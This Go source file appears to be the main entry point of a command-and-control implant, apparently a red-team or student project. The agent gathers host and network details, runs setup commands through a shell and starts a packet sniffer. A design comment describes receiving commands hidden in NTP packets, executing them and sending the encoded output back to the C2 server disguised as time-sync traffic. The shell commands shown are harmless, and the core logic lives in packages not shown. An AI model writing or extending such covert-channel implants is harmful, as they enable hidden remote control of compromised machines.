package main

import (
	"fmt"
	//"os"
	"os/exec"
	//"strings"
	//"bytes"
	//"log"

	//"mesa/client/pkg/ntppacket"
	//"mesa/client/pkg/listener"
	"mesa/goclient/pkg/agent"
	"mesa/goclient/pkg/handler"
	//"github.com/google/gopacket"
	//"github.com/google/gopacket/pcap"
)

var newAgent agent.Agent

func init() {
	newAgent = agent.Agent{}
	newAgent.OpSys, newAgent.ShellType, newAgent.ShellFlag = agent.DetectOS()
	newAgent.IFace = agent.GetNetAdapter(newAgent)
	newAgent.ServerIP = agent.GetServerIP()
	newAgent.MyIP = agent.GetMyIP()
}

func main() {
	//NTP server ip passed as an argument when building? yes
	//fmt.Println("right there")
	Setup(newAgent)

	//start listening, goroutine handler for concurrent traffic
	//program runs until break
	handler.StartSniffer(newAgent)

}

//Setup - sets up NTP configurations based on OS, sends out first beacon, add firewall rule every 5?
func Setup(newAgent agent.Agent) {
	var commandList []string
	if newAgent.OpSys == "Windows" {
		commandList = []string{"net start w32time", "w32tm /resync"} //TODO add actual command }
	} else {
		commandList = []string{"echo working", "echo yes!"}
	}

	for _, s := range commandList {
		output, err := exec.Command(newAgent.ShellType, newAgent.ShellFlag, s).Output()

		if err != nil {
			fmt.Println(err.Error())
			fmt.Println("Couldn't execute command")
		}

		fmt.Println(string(output))
	}

}

/*


raw sockets

recieve beacon, see ping/comd id
parse/decode bytes into readable
->run commmand
->get output
->encode output
->send output back to c2
->make it so NTP packet isn't actually read in
-> send actual NTP request for time

->see ping
->resync request
->receive actual time info from NTP server



client also must check to see if the time service is running


TODO agent is compiled for specific os, sends initial ping



//TODO add firewall command rule in setup
*/
